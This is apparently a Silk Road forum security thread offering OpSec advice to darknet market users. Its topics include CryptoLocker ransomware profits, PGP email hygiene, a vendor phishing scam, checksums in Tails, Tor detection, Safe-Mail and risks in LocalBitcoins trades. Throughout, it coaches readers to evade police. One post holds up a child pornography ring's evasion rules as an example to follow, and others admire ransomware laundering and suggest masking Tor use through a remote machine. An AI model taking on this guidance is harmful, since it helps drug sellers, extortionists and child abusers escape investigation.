Windowsâ default behaviour of hiding the extension from file names to disguise the real .EXE extension. When activated, the malware encrypts certain types of files stored on local and mounted network drives using RSA public-key cryptography to generate a 2048-bit RSA key pair, with the private key stored only on the malwareâs control servers. The malware then displays a message which offers to decrypt the data if a payment (through either Bitcoin or a pre-paid voucher) is made by a stated deadline, and threatens to delete the private key if the deadline passes. If the deadline is not met, the malware offers to decrypt data via an online service provided by the malwareâs operators, for a significantly higher price in Bitcoin. Dell SecureWorks estimates that CryptoLocker has infected 250,000 victims. The average payout is $300 each, and millions in laundered Bitcoin have been tracked and traced to the ransomwareâs money runners. In November 2013, the operators of CryptoLocker launched an online service which claims to allow users to decrypt their files without the CryptoLocker program, and to purchase the decryption key after the deadline expires; the process involves uploading an encrypted file to the site as a sample, and waiting for the service to find a match, which the site claims would occur within 24 hours. Once a match is found, the user can pay for the key online; if the 72-hour deadline has passed, the cost increases to 10 Bitcoin. To date, no one has successfully defeated CryptoLocker. The Swansea, Massachusetts police department was hit in November. The officers paid CryptoLockerâs ransom. Police Lt. Gregory Ryan told press that his department shelled out around $750 for two Bitcoin on November 10. One of the reasons I am posting this, is that CryptoLocker uses 2,048 RSA encryption, and if you remember in the PGP posts earlier in this thread I recommended to use 4096. Even with 2,048 bit encryption, no one has successfully defeated CryptoLocker, and this is the power of properly implemented cryptography. And, using the proper methods of anonymity, this person or group has managed to acquire, according to research done by ZDNet, around 41,928 BTC. http://www.zdnet.com/cryptolockers-crimewave-a-trail-of-millions-in-laundered-bitcoin-7000024579/Quote     In research for this article ZDnet traced four bitcoin addresses posted (and re-posted) in forums by multiple CryptoLocker victims, showing movement of 41,928 BTC between October 15 and December 18.     Based on the current Bitcoin value of $661, the malware ninjas have moved $27,780,000 through those four addresses alone â if CryptoLocker cashes out today.     If CryptoLockerâs supervillans cash out when Bitcoin soars back up to $1000, like it did on November 27â¦ Well, $41.9 million isnât bad for three months of work. As you can see, properly executed cryptography and anonymity allowed this group of people acquire the Bitcoin equivalent of almost $42 million in just now 4 months at the time of this post. I am not recommending or advocating that you do this, but just giving you a perfect example of how powerful the combination of these two very important factors are in protecting anybody online when used properly. PGP/GPG Email AddressesThis post was created by HonoluluExpress and posted at the following page and I have decided to add it to my security thread with his permission. The rest of the post is written in his words. http://silkroad5v7dywlc.onion/index.php?topic=19277.msg383130#msg383130 Over the time Iâve been here Iâve been talking to a lot of people. I have also acquired a lot of gpg/pgp keys and I see that LOT of people use there real email addresses. I would like to remind everyone that when you give someone your pgp/gpg key THEY CAN SEE THE EMAIL ADDRESS THAT YOU ASSOCIATED WITH THAT KEY. You are NOT suppose to use ANY type of clearnet email service such as: gmail, yahoo, hotmail, etc. If you want to use a valid email address then you need to use an email provider that supports Tor and anonymity. For example I use safe-mail. Iâm able to access this email service on Tor which allows me to stay anonymous. You may also use an email such as â123@123.comâ. DO NOT UNDER ANY CIRCUMSTANCES ASSOCIATE A CLEAR NET EMAIL ADDRESS WITH YOUR PGP/GPG KEY. THIS WILL COMPROMISE YOUR ANONYMITY. Definition of DOX: Personal information about people on the Internet, often including real name, known aliases, address, phone number, SSN, credit card number, etc. ANOTHER SCAM EMAIL â BEWARE If you have been following my thread for a while now, you will remember the previous email scam going around trying to get people to download an infection version of tor. With Silk Road at the time of this post now boasting over 25,000 members, it is easy to get that these occurrences are likely going to increase and unfortunately some people are going to fall for them. This new one is directed at vendors, but it nonetheless should serve as an example of the type of scams that people are going to be trying to pull on members of this forum and other forums.Quote     Dear Valued Vendor,     Due to the recent instability of the site, and our programmers inability to remedy the problems in a timely manner, we are going to have to temporarily shut down vendor accounts. Since we canât just stop operation of the site completely, we are forced to develop a way for only some of the vendors to go into a temporary vacation mode. In need of recent server upgrades, as well as this new method we are implementing, it has occured to us that the only way to pick which vendors are going to remain in business is by how much sales/profit they are doing, as well as how much being a vendor on our site means to them. Hereâs how this is going to work:     If you would like to keep vending on the site during our upgrades/repairs, we are going to require that you pay an additional .3BTC bond to us. If you pay this .3BTC bond, your account will remain active and you will keep vending while we work to fix the problems. If you do not pay this .3BTC bond, your account will be temporarily put into vacation mode status and you will be unable to vend until we locate and remedy the problem. We are very sorry for these changes!     In the event you do pay the bond, as soon as the vending opens back up to everyone, you will have your .3BTC bond returned, and you will receive a premium vendor account status. You will have a title on your page that displays you as âHardcore Vendorâ. We are terribly sorry we have to ask this of all our hardworking vendors, but there is really no other way for us to decide WHO gets to keep vending and who has to wait until we fix things.     Our team is working hard at the problem, and we estimate it will be no longer than a week for the changes to be made and vending to open back up to everyone.     Vendors who will pay bond: Please send .3BTC to BTC Address: 1NbEs2rJgreRUvjp9o7hUWo3akeLA3EfFY     Vendors who are unable to pay bond: Your accounts will go into vacation mode at 12:01AM UTC February 2nd.     Let us never forget this recent hurdle in our battle for freedom. But let us not allow it to stop our fight, either â it is now time to simply pick ourselves back up, dust ourselves off, and continue fighting this revolution like weâve never fought it before.     Iâm proud to have you all at my side.     Yours Loyally     Dread Pirate Roberts The user who sent out this message actually used the name Dread Pirates Robert, which is similar but not correct. One thing you should be aware of, is that any type of announcement like this from a high ranking Administrator like DPR will always be signed with their PGP signature. And remember, we discussed how to verify these signatures in a previous post. I remember when a moderator named Sarge was in charge of vendor bonds, there was a user with the name Sarrge (two râs) that was trying to scam vendors into sending their bonds to his address instead and unfortunately, several people fell for this scam. Please always check if there is a PGP signature, and if there is not, kindly ask the Administrator or Moderator to resend the message to you using a signature. Protect yourself by verifying the name and make sure this user has an Administrator or Moderator status on the forum. Be safe!",""

Try to upgrade yourself with it.AN INTRODUCTION TO AN EXPERT ON OPSEC, PLUS MD5 & SHA-1 CHECKSUMSers to people keeping themselves anonymous online. He goes by the online handle, âThe Grugqâ, and Grugq has his own blog which can be found at the following webpage. http://grugq.github.io/ It should be noted that Grugq was at one time on the payroll of the US government for finding and selling zero day exploits. If you remember the previous post about how the US federal government is the singlemost purchaser of malware in the world, well Grugq was one of those who sold malware to the government. Unfortunately for him, when he went public about it, they no longer wanted to buy malware from him because they like to maintain their own anonymity when purchasing these exploits. And here is a short biography from an online website.Quote     Biography:     The Grugq is an Information Security Professional who has has worked with digital forensic analysis, binary reverse engineering, rootkits, Voice over IP, telecommunications and financial security. He has reported to be an exploit broker for 15% of the sale. Last but not least, he has also spoken at various security conferences.     Facts     He developed âuserland execâ     He is the author of Hash (hacker shell), a tool to enable people to evade detection while penetrating a system.     He has released a voip attack software.     Claims to have made mad loot on being an exploit broker (middleman).     https://www.soldierx.com/hdb/Grugq Why are we talking about the Grugq? Who cares? Well, he has some of the best information on keeping yourself anonymous and maintaining privacy online and he is somebody who you should all familiarize yourselves with. He writes blog posts, and he has done video presentations at security and hacker conferences, with his most famous presentation, at least in the world of Silk Road being the one he did on OpSec. Since I know it is hard for Tails users to watch videos on YouTube, I decided to download it from YouTube and upload it to AnonFiles.com so you all can watch it. The presentation is about 1 hour long, and an essential to everyone who wishes to maintain their anonymity online. Remember, you only have to screw up once. https://anonfiles.com/file/b6de41da8d1fca2fabf725f79d2a90df SHA1 Sum: 1a9e6c67a527b42a05111e1b18c7a037744bb51eMD5 Sum: b6de41da8d1fca2fabf725f79d2a90df Once you have downloaded the file, I want you to check something called the checksum of the file. The checksum is where the contents of the entire file get plugged into a mathematical algorithm and output a specific string. You can see the two strings above. This is something you should all get into the habit of doing when possible is verifying the checksum of your files. If you remember when we talked about signature files and PGP, this is another method of verifying your downloads but not as good as the signature files. It should however, whenever provided be performed to verify your downloads when the signature file + PGP combination is not available. Once you have downloaded the file in Tails, the first thing you should do, is move the file you downloaded to your tmp folder. In order to do this, look up at the top and click Places -> Computer -> File System -> tmp. This is where you move the file your downloaded to, and to keep things easier, rename the file grugq.zip and you will see why you want to do that in a second. Next we are going to open a terminal window (like a DOS prompt) by clicking the black rectangle icon in the upper left center area of Tails. Once you have opened your terminal window, we are going to perform some Linux commands. cd /tmp â This will change the current directory you are operating within the terminal to your tmp folder and allow you to more easily access the files in that folder. sha1sum grugq.zip â This will perform a SHA1 checksum on the file you just downloaded, and you can see why you wanted to rename the file. It should give you the same output as the SHA1 sum listed above. md5sum grugq.zip â This will perform an MD5 checksum on the file you just downloaded, and is another way of checking the file. SHA1 is better because it is harder produce the same output twice with different file contents using SHA1 versus MD5, but nonetheless, use both whenever possible and always check your downloaded files. Ok, assuming your downloaded video passed the checksum test, you can be assured that the video file that I uploaded has not been tampered with, or had any malicious code injected into it. When even a single character is changed in the source code of a given file, the checksum output will be completely different. Most people think it may be off by a a few characters, but the difference is always quite large and is why performing checksums is an important way of verifying your downloads. Since you now have a 1 hour video presentation that you all need to watch and rewatch (You can do this in Tails), I will end this post and continue with my next post from the assumption that you can completed watching this highly recommended and endorsed (by SR administrators and moderators) video on OpSec. We will start looking more into the recommendations from the Grugq. He will be an invaluable resource of information for us, and I will mainly be translating some of his posts into a more understandable format for those of you who are less technically capable and also keeping them on the Silk Road forum hidden services. ââBEGIN PGP SIGNATUREââ iQIcBAEBCgAGBQJS7wteAAoJEPuh6tSg81nyhyYP/0nFaWRq0GPe6/5XeMUj3yiZ2fBaJ+7SXOMxnNXPZw9XAN5Hkpp9wPQmk8W27otuIk2N+iom8H0tJcGZi7hiMd45Dv0NOrt/gS3bst/G37I+tPwdnWxb1pVNCS+3XnuLOo9IA7VdykU8tz6R+68kPB259lDguaUYVeGp2AJMezQ01LL60xQvv25TFLgiPrYD611bscVadckhSV5upXlbMW9+WVzJG1mgY9gmUYQV6D5ErPGIvxm8cC+IVlzwgGHQPd3kq2QlmQF3XJrXqWGPXd8dewkD6VnrU8yO6tVMCG57K1xO9a9zPYp6yN1IOe69IsRkK7g266D+cz6Idwt97/Vr5jgu1Ook8dfFGA3Sxg+qpoARt5diWKchvmqbxRrnFdOtCAawH1+DgNcVdepi7agkzhIES1drHdIM1uQ9Wg3vegCLrU3HDpRwwyWoSZxH4kxruU7aByOH5ZdAZw9JV6Lkb5JzVjrvrhayXwiHPQnnjM50RT9jPH44PhNZCN4G7Ln2Rkb7qa/kS5sA4W2dRwXfSjtYXf+18pCp/7NL09LD+LsabZHEAa/MilWxjsAnLLIrJsnw3YbSUola/ebmnIq8oUW20yP0fDOHdeSGVq1uLNZIadZHZtmZIGqBigPU3XAKLxYajssglAgcPxD8E4vcrkKb3PIyz1k1/JXulymR=zJvPââEND PGP SIGNATUREââ IT IS OBVIOUS WHEN YOU ARE USING TORThis is going to be a short post about a mistake we can all learn from when a Harvard student emailed a bomb threat to his school while using tor to avoid a final exam. http://www.forbes.com/sites/runasandvik/2013/12/18/harvard-student-receives-f-for-tor-failure-while-sending-anonymous-bomb-threat/Quote     â¦the student âtook steps to disguise his identityâ by using Tor, a software which allows users to browse the web anonymously, and Guerrilla Mail, a service which allows users to create free, temporary email addresses.     Despite 20-year-old Eldo Kimâs goal of anonymity, his attempts to mask his identity led authorities right to his front door. Does that mean that Tor failed a user looking to delay his âPolitics of American Educationâ exam? Not in the slightest.     While the Harvard student did indeed use Tor, it was his other sloppy security measures that led to his arrest. The complaint says the university âwas able to determine that, in the several hours leading up to the receipt of the e-mail messages â¦ Eldo Kim accessed Tor using Harvardâs wireless network.â     What Kim didnât realize is that Tor, which masks online activity, doesnât hide the fact that you are using the software. In analyzing the headers of the emails sent through the Guerrilla Mail account, authorities were able to determine that the anonymous sender was connected to the anonymity network.     Using that conclusion, they then attempted to discern which students had been using Tor on the Harvard wireless network around the time of the threats. Before firing up Tor, Kim had to log on to the schoolâs wireless system, which requires users to authenticate with a username and password. By going through network logs and looking for users who connected to the publicly-known IP addresses that are part of the Tor network, the university was able to cross-reference users that were using both Tor and its wireless internet around the time the bomb threats were received. There is not much for me to add other than the fact that, if you are planning on doing some freedom fighting, activism or just using Silk Road, make sure that you are able to do so where using tor is not going to raise some flags. In the case of this student, he was likely the only student at Harvard using tor at the moment this email was sent, and when the authorities came to his dorm he quickly admitted he was responsible. He likely never would have been caught, but remember when you use tor, others can be aware that you are using it. A better idea for him would have been to connect to another computer remotely and have that computer connected to tor to send the email. This way, they never could have seen his computer connected to tor. I would not worry about using tor on a regular basis from your home, because there are hundreds of thousands of tor users, but it is again, something to be aware of. tor will not cover your bad OpSec mistakes like in the case of Eldo Kim. ARE YOU USING SAFE-MAIL.NET ?A recent article on Forbes.com talks about a false sense of security users may have when using Safe-Mail.net http://www.forbes.com/sites/runasandvik/2014/01/31/the-email-service-the-dark-web-is-actually-using/ If you are a user of Silk Road, you have likely seen many users advocating the use of a service called Safe-Mail.net. This company describes itself as âthe most secure, easy to use communication systemâ, and many Silk Road users have adopted it. But there are some things you should be aware of.Quote     Known users of the Safe-mail web service include operators, vendors and customers of the dark webâs many drug market sites, journalists writing about the investigation into Silk Road, and BTCKing, the vendor who ran an underground anonymous Bitcoin exchange and allegedly worked with BitInstant CEO Charlie Shrem to sell more than $1 million worth of Bitcoins to users of Silk Road.     When I reached out to Safe-mail for comment, Amiram Ofir, Safe-mailâs President and CEO, responded in an email that the company and its employees âcertainly are not aware of any criminal activity,â adding that the company does âfollow court orders that are issued in Israel by an Israeli court. Any other law enforcement agency should contact the Israeli authorities.â Itâs worth noting, however, that Israel signed a Mutual Legal Assistance Treaty (MLAT) with the U.S. in 1998. An MLAT request was used to image the Silk Road web server, according to the criminal complaint of Sept. 27, 2013.     Ofir told me that communications between users and the web service are SSL protected, and that information stored on the server is encrypted with user-specific keys. When asked if Safe-mail has received court orders issued by an Israeli court on behalf of a non-Israeli law enforcement agency, such as the FBI, Ofir replied with a short âYes.â My followup email, asking if Safe-mail has the ability to decrypt information without a userâs key, went unanswered. So, the first time to note is that the FBI is already aware of Safe-Mail.net and is already receiving court orders from non-Israeli law enforcement agencies. And they are likely giving them everything they need in order to read the emails. Therefore, you should remember that no email service should be trusted. No email service is going to go to jail for you. And if you are sending anything sensitive over email using plain text, it will likely be read eventually by somebody other than the intended recipients. This is why things such as strong PGP encryption are essential to any type of sensitive communication. With this, it should be noted that Safe-Mail is no safer than Gmail when it comes to protecting your privacy with its centralized email service. Never trust any company with your privacy, always encrypt. YET ANOTHER EXAMPLE OF HOW STRONG CRYPTOPGRAPHY AND PROPER OPSEC CAN PROTECT EVEN PEDOPHILESYes, you read the title correctly. Using the same types of techniques taught in this thread, you can and should remain anonymous no matter what you are doing. Pedophiles and child pornographers are some of the most wanted people on the planet. They are up there with terrorists and serial killers. They are hunted by federal law enforcement agencies, and punished very seriously, as they should. So the reason for this post is to demonstrate, that if somebody who is as wanted as much as pedophiles and child pornographers can remain free by using proper OpSec, then you can too.Quote     If your secure communications platform isnât being used by terrorists and pedophiles, youâre probably doing it wrong.     http://grugq.github.io/blog/2013/12/01/yardbirds-effective-usenet-tradecraft/ I want to talk to you about a group of child pornographers that operated for several years online, called YardBird. During a period of 15 months, there were around 400,000 images and 11,000 videos uploaded to a central server run by the group and shared by the members. The reason we know that, is because during that 15 months, the FBI performed an undercover operation to infiltrate the group in hopes of apprehending the members. They successfully apprehended 1 in 3 members of the group. One of those who remain free to date, was the leader of the group, who also went by the online name YardBird. How is it possible that after so much effort was put in by the American Federal Bureau of Investigation (FBI), the Australian Federal Police (AFP) and the Australian Queensland Police Service, that people high up on the wanted lists were able to evade capture. They used strong cryptography, and proper OpSec rules. Let us now talk about the history of the attempted apprehension of this group. According to the FBI.Quote     There were approximately 60 members that were loosely identified, and from the 60, approximately 20 were positively identified in this group.     There were numerous challenges presented during Operation Achilles. The group utilized an unprecedented level of organization and sophistication. They had a timed test for prospective new members. They had to use encryption technology and Internet-based anonymizers, re-mailing services. They also intentionally corrupted their own child pornography files and only the new members knew how to reconfigure those files to be able to read the pictures or the video. They also had the uncanny ability to monitor worldwide news pertaining to law enforcement efforts in child pornography matters in order to better educate themselves to avoid law enforcement detection.     https://www.fbi.gov/news/podcasts/inside/operation-achilles.mp3/view As I said earlier, the alleged leader of this ring used the online name âYardbirdâ. Yardbird made a re-appearance on Usenet in both 2009 and 2010 on the date corresponding to the first and second anniversaries of the busts in 2008. His intent was to show that he was still free, and to answer peopleâs questions. One of the most important things Yardbird stated were that everyone in the group who used Tor and remailers remained free, while those who relied on services such as Privacy.LI were arrested and convicted. Privacy.li is an offshore VPN service that promises anonymity. They claim from their website the following.Quote     If you need corporate and/or military strength encrypted networks, then a Virtual Private Network is the way to go. All and any traffic from and to your desktop are within an encrypted tunnel, and your originating IP-address is well concealed.     http://www.privacy.li/services.html And their privacy policy makes the following promise.Quote     Yes, we 101% honor your privacy, no logs, no snooping, no profiling. No legal mumbo-jumbo to disguise any hidden efforts. We believe in individualism and privacy, even anonymity.     http://www.privacy.li/privacy-policy.html Yardbird further commented that several members of the group, including his second-in-command Christopher Stubbings (Helen) and Gary Lakey (Eggplant) were Privacy.LI users â in fact he stated that they used it for everything. (Helen is currently serving a 25-year sentence in the UK, while Eggplant is serving life in an Arizona prison.) Eggplant literally became notorious because of his constant promotion of Privacy.LI â he continually boasted that he could not be caught because Privacy.LI did not keep logs, and they were located outside of U.S. jurisdiction.Quote     I pointed out to anyone who would listen that services such as Privacy.LI    were for /privacy/ â not for anonymity. In an ideal situation, one needs    both to be private as well as anonymous. Essentially, what Privacy.LI    supplied was a type of VPN service, providing an encrypted tunnel for data    to travel between two endpointsâthe customerâs computer being one endpoint, while the Privacy.LI servers provided the other. While there was a degree of privacy, there was NO anonymity at allâso it really didnât come as a  surprise that Privacy.LIâs customers were among those arrested.     http://dee.su/uploads/baal.html At the end of the day, no service provider is going to go to jail for you. A simple court order can get even the toughest VPN providers to roll over on their users, because they would rather betray a $20 per month user than be fined, shut down and possibly thrown in jail for interfering with a federal investigation. What other mistakes were made to lead to the arrest of some members of this group? The Australian police arrested a man on totally unrelated child pornography charges, and presumably as part of a plea deal, he revealed the  existence of âthe groupâ and handed over a PGP public/private keypair and password. Having acquired from the informer the current group PGP public/private keypair, and its passphrase meant that the police could assume this group memberâs identity, and furthermore, read all the encrypted traffic posted by members of the group.Quote     Once the group was penetrated, the police were able to take advantage of a    few factors:     1) They had the informantâs computer, with all its email, PGP keys and the    like. This provided a history, which made it easier to continue the    impersonation.     2) By the time it was penetrated, the group had been operating for about 5    years. By this time, the group had jelled into a community â people were    familiar with each other, they often let their guards down, and would    sometimes reveal tidbits of personal information. This is especially the    case when they thought their messages were secure, and beyond the ability    of the police to interceptâthey would say things that they would *never*    say in the open.     http://dee.su/uploads/baal.html So it is important to note at this time, that you no matter how comfortable you become with somebody, there is always a chance that they can become compromised. In fact, the group has a set of rules, that all members were told to abide by, and if any member was found to be breaking the following rules, they would be expelled.Quote         Never reveal true identity to another member of the group    Never communicate with another member of the group outside the usenet channel    Group membership remains strictly within the confines of the Internet    No member can positively identify another    Members do not reveal personally identifying information    Primary communications newsgroup is migrated regularly    If a member violates a security rule, e.g. fails to encrypt a message    Periodically to reduce chance of law enforcement discovery    On each newsgroup migration    Create new PGP key pair, unlinking from previous messages    Each member creates a new nickname    Nickname theme selected by Yardbird     http://grugq.github.io/blog/2013/12/01/yardbirds-effective-usenet-tradecraft/ The ones who got caught, were the ones who did not follow the rules by putting too much trust in their online âfriendsâ. We saw this in the arrest of Sabu when he helped the FBI bust his âfriendsâ in LulzSec. If someone is given a deal to cut the amount of time spent in prison in half, they likely will take the deal at your expense. Below is an example of a plea versus trying to fight the charges in this exact case.Quote     â¦seven of the U.S. subjects pleaded guilty pre-trial to a 40-count indictment and received federal sentences ranging from 13-30 years in prison. The remaining seven defendants opted for a joint, simultaneous trial. All seven were convicted by a jury and subsequently sentenced to life in prison.     https://www.fbi.gov/news/podcasts/inside/operation-achilles.mp3/view 13-30 years versus life in prison, may entice even some of the hardest criminals, and if you think your online âfriendâ who you have never met in person is going to keep their mouth shut to keep you out of jail, you are in for a big surprise. So, as you can see, the group was pretty much an open book to the police. They were completely and thoroughly penetrated. Despite that, however, the  majority of the group were still able to remain at large, and were neither positively identified nor arrested. This is due to the privacy tools (pgp, tor, nymservers, remailers) that were employed. Even with everything else being an open book, those using these tools still managed to evade capture. But you may be saying, Ok, I understand PGP, I understand tor, but what the heck is a nymserver and a remailer? In a nutshell, an anonymous remailer is a server that receives messages (in this case an email) with embedded instructions on where to send them next, and that forwards them without revealing where they originally came from. A nymserver also referred to as a pseudonymous remailer assigns its users a user name, and it keeps a database of instructions on how to return messages to the real user. These instructions usually involve the anonymous remailer network itself, thus protecting the true identity of the user. Some of the advantages of using these services are to protect the intended recipient from an adversary, and also protect the sender of the message. Some of these services use what is called a common mailbox, in which all messages are stored in a central mail box with no âTo and Fromâ headers. It is up to the users who use the service to attempt to use their PGP keys to try and decrypt all of the messages stored in the central message box and see if they can decrypt any of them. If they can, this message is intended for them. This way it rules out again, the sender and receiver. This system of remailers, can also form a chain, in which the message is bounced off of multiple remailers before making it to its intended reicipient to widen the gap between the sender and receiver. Another effective option some services offer is the ability to delay when the message gets sent on to the next server in the chain, or the recipient itself. If you are found to be sending out PGP encrypted traffic through some type of analysis at 5:00PM, and another person being monitored receives it at 5:01PM, it is easier to correlate that this message may be from you to the other person being monitored. At this time I have no recommendations for service to use, but I am likely to post about them in the future. In the meantime, let us get back to the ring of pedophiles shall we?Quote     Leaving aside my personal feelings about pedophiles, I brought up this case    as an example for several reasons:     1) Child pornography is a serious crime in virtually every jurisdiction.    As this example demonstrates, police will work together, even across    national boundaries, to investigate these crimes. They are willing    to invest considerable time, manpower and money in pursuit of these    suspects. The only other crimes which usually merit this type of    approach are drug/gun-running or terrorism. The level of effort    expended in pursuing this group can be seen in that even FBI    executive assistant director J. Stephen Tidwell was involved.     Normally one would not expect FBI personnel that highly placed    to be involved â this shows the level of importance placed on    this particular investigation. (A year or so after the busts,    Yardbird himself expressed astonishment that the FBI would    consider his group such a priority.)     2) This case is the only one that Iâm aware of, where suspects were    using sophisticated tools like PGP, Tor, anonymous remailers and    nymservers.     3) This case underscores the effectiveness of these tools even against    well-funded, powerful opponents like the FBI, Europol, and Interpol.    (N.B.: FWIW, those who were caught used either inappropriate and/or    ineffective tools and techniques to protect themselves.     4) I fully understand most peopleâs disgust at the types of crimes/    criminals being discussed here. That said, it is important to    remember that one simply cannot design a system that provides    protection for one class of people, but denies it for another.    You canât, for example, deploy a system that provides privacy/    anonymity for political dissidents, or whistle blowers, and yet    denies it to pedophiles â either *everyone* is safe, or NO ONE    is safe. This may not be palatable, but these are the facts.     http://dee.su/uploads/baal.html To summarize. We have seen that even the most hunted criminals, can evade capture when using strong cryptography and proper OpSec. The ring leader of one of the most investigated child pornography rings still remains at large today because those who followed the rules. LOCALBITCOINS PART 1 â POLICE ARE WATCHING IT! have a few stories to share from people who used LocalBitCoins to sell their Bitcoins.Quote     In September and October, I sold 213 BTC (gradually) to some random guy on localbitcoins. Everything went fine, each time I got the money, I sent the bitcoins. 5 days after the last transaction, I get arrested by the police. âWhere does this money come from?â I explain about bitcoins, and tell them all I know about the random guy, I volunteer my phone to analyse my emails and check my story. Once they were sure that the guy contacted me and not the other way around, I was finally free to go. Later they told me that the money was stolen and they thought I was doing money laundering.     Now after almost 3 months and a lot of back and forth with the police, they are now suggesting that I send back the money. I would gladly do that if they arrested the criminal and found out he can not repay. Right now if I send back the money, the innocent person who got his money stolen gets it back, but then I become the innocent person who got his money stolen, so that makes no sense to me.     Edit: I just saw a lawyer. According to him I already won the case. But itâs going to cost me some serious money in lawyerâs feesâ¦ More than my cumulated profits. I take that as the cost of a great life lesson and a wake-up call.     He also told me I can disclose the info that the police already knows. So here we go. Iâm in Brisbane, Australia. The reason the police froze my account and not the criminalâs account is that they wanted to know where the money was going. The police are regularly checking my house to make sure the criminal is not seeking revenge (he has my full address and I have 2 kids).     http://www.reddit.com/r/Bitcoin/comments/1to08d/arrested_by_the_police_for_localbitcoins_business/ This guy, likely a BTC miner, was arrested and questioned by police for selling BTC to a buyer over several transactions. They must have assumed that the buyer was using fraudulent funds and this shifted suspicion onto the seller as well. I do not know if this story is true, but I am tending to believe it is. Police are monitoring these transactions, so you better make sure you have a reasonable explanation as to where you obtained the Bitcoins you are trying to sell. This next story was removed by the original poster (OP), but luckily somebody in the replies quoted the entire post and therefore I was able to grab it.Quote     So, as a few of you guys know, Iâm moving to another country soon enough. When I get over there I wonât have access to my bank account, so a few weeks ago I decided it might be a good idea to sell some of my BTC for cash. I had done this a couple of times before and had a positive experience, so had no whims about doing it again.     So I received a request from someone who wanted to buy 500euro worth of BTC in a f2f transaction. I drove down to meeting spot, met the guy, he gave me the 500euro and basically ran back to his car and drove off. I obviously found this strange, but it was an escrow tx, so I released escrow from my phone and went back to my car.     On my drive back, I noticed that there was a Ford Mondeo behind me (the kind of car that is usually used by undercover police in my city). It seemed to be following me, I didnât have all my paperwork on my car in order,  so I decided to take a detour down some local back-roads and shake it.     So anyways, I lost the car, drove home and thought nothing of this strange encounter.     Over the next few days, I noticed strange needle marks and tiny tears in all of my mail, I also noticed a really strange parked car outside my house one day, when I walked over to it to ask them what they were doing there, they drove off at speed. I probably shouldâve been suspicious then, but I had done nothing wrong and shrugged it off.     A couple of days later, I wake up to the sound of my door being smashed in. I run down to find 5 police officers in my house. They showed me a search warrant under the misuse of drugs act. The national drugs unit were parked outside with sniffer dogs ready, they left after a few minutes though and didnât come inside with the dogs. The police told me the person I met on localbitcoins was an undercover police officer, and they had copied the registration number off of my car and got my address from it.     They stripped the whole house down, turned everything upside down looking for drugs. They found 1 joint of weed and they also seized a clock which they thought was a digital scale (it wasnât) and informed me that they were going to prosecute me for intent to supply, even though I wasnât selling, and I showed them a prescription from a doctor in another country (that isnât valid here) and told them the superintendant of the local police station had informally told me that they wouldnât prosecute me for possession if it was medical use even though I was technically breaking the law. They also found padded envelopes and accused me of selling drugs through the post (a complete lie with no evidence).     They then told me that if I didnât give them all the messages & phone numbers of everyone I had met to sell BTC that they were going to seize all my bitcoin miners, computers etc and have them âanalyzedâ. I was about to move country in the next few days and didnât want the hassle of having to deal with this, so I told them that I had deleted all the messages (which I did) but that I would be able to get them back if they left my computers there, and that I would co-operate fully (Iâm obviously not going to co-operate). They then left and I changed my flight date and basically fled the country the next day, luckily I was planning on moving in a week anyways.     So, a warning to you guys, be careful doing f2f transactions or buying/selling BTC in general, even though weâre not breaking the law it doesnât mean you wonât get unwanted attention from the police.     https://bitcointalk.org/index.php?topic=174918.msg1820363#msg1820363 This story above, I do not know if it is true either, but it is something to think about. According to the OP, law enforcement wanted all his messages and phone numbers, obviously to try and find other people involved in money laundering and the drug trade. He was scared enough to have deleted the original post, but as I mentioned, some other people quoted it and I was able to grab it. To summarize, the police are likely watching these Bitcoin transactions to some degree and you need to establish a buyer or seller that you can trust. Once you find a good one, stick with them, even if their rates go up. Try to search for people with established feedback, ask for ID if you want, and make sure you have nothing incriminating on you, or at your home around the time of these transactions. You never know when you could be trying to offload your BTC to a cop! LOCALBITCOINS PART 2 â THIEVES, SCAMMERS AND COUNTERFEIT BILLS!This post is a continuation from the last one. The threat of being ripped off or scammed on LocalBitcoin is a very real threat. One that you need to be aware of. I want to share a few stories with you.Quote     Going to keep it short and simple. I live in a major metropolitan city, and do a lot of business of craigslist. Meet in person, public location, inspect the item, hand cash and be on my way. Iâm sure I have 25+ transactions, never been scammed.     Today, I saw someone include just as a footnote âI also accept bitcoinsâ. Not âI only accept bitcoinsâ or âplz send bitcoins i mailâ just a little footnote that they are fine with it.     Contacted, mentioned purchasing in cash, that was fine, and at the end decided to do it in bitcoins. Brought my laptop, public wifi, took a seat at a McDonalds. Inspected the headphones â Perfect condition, as described, everything was looking good.     He hands me a paper cutout with a wallet address, I key it into blockchain, he is looking at the address on screen. I confirm the price (80 USD, was .8xxbtc), he says good, I hit send, the little blockchain beep plays over the speakers.     He casually stands up, has the headphones, and walks away. I stand up pretty quick, and shout after to him, accusing him of theft. He says a quick comment around the lines of âIf you canât pay the price donât waste my time, I said $80? and walks out.     I contemplate chasing after him, calling the police, or fuck maybe getting some public attention, then I realized I didnât have a leg to stand on.     Cameras would show a guy sitting down at a table, showing me headphones, me inspecting them, then playing on a computer for a bit, with him walking off. I attempt to accuse him of theft, he probably didnât even have $80 in his wallet, nothing would show me handing him cash, and the worst part, as I sat there with a mixture of adrenaline, rage and frustration â is that It was impossible for me to get that money back.     Can you imagine trying to talk to the police about this? So yeah officer, I sent him bitcoins, a virtually currency for this craigslist transaction, and then he walks off â Sir, do you have any proof of this? Well, he gave me this address of random letters, but I swear itâs his, but it isnât there anymore, itâs gone to a mixing service where it gets pu-     You get the point. I have a decently hard time explaining bitcoins to my eager, willing to learn friends. I canât imagine trying to explain it to an officer who thinks I just tried to give someone WoW gold for headphones.     So, is there any safety precaution out there I didnât take, or should you just keep BTC and Craigslist as far apart as possible?     Thanks for reading the rant. Sorry for the wall of text. I guess I just kinda needed to get it out there.     http://www.reddit.com/r/Bitcoin/comments/1b89wm/i_just_got_robbed_blind_of_bitcoins_in_person_im/ Remember, the risk of something like the above happening increases with the amount of Bitcoin being traded for FIAT currency (Government paper or electronic currency). So if you are trying to unload a few Bitcoins to a seller, you may find yourself in a similar situation from time to time and it is best to prepare yourself in case this happen. Bring a friend with you, have them wait at the door in case the person tries to run away, or better yet, multiple friends. If you live in a country or state where it is legal to carry a concealed weapon, then you might want to consider doing this as well.Quote        A dangerous new scamming trend? Â£15,000 too close     So it appears that unfortunately scammers have changed their tactics. I have been advised by police not to disclose the username or details of the person concerned until their investigation is complete but I am ok to disclose the story as a warning to others. Today I went to meet a buyer who was looking for Â£15,000 worth of bitcoins and wanted to pay in cash but this particular user had a good buyer history so although cautious I agreed to meet him in London in a place I knew there would be CCTV and security for my own safety. Arriving there today in a public place, all went fine initially from chatting with him but when I pulled out a quick form to comply with AMLâs he seemed very uncomfortable which although I didnât show it, it sent alarm bells ringing in my head as he kind of covered his ID whilst in terrible handwriting filled out the form and done a completely unreadable 